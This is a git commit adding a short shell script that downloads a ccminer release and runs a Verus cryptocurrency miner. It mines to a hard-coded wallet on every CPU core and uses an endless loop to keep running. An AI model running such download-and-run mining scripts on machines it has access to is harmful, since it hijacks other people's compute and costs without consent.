299588906accf11abc0f8eaa4874c88ed53cc5cf
malogrono <136266511+malogrono@users.noreply.github.com>
2024-10-23 09:47:33 +0700

    Create pola.sh

---
+++ pola.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz
+tar -xf ccminer_CPU_3.8.3.tar.xz
+chmod 777 ccminer
+./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6.panas $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
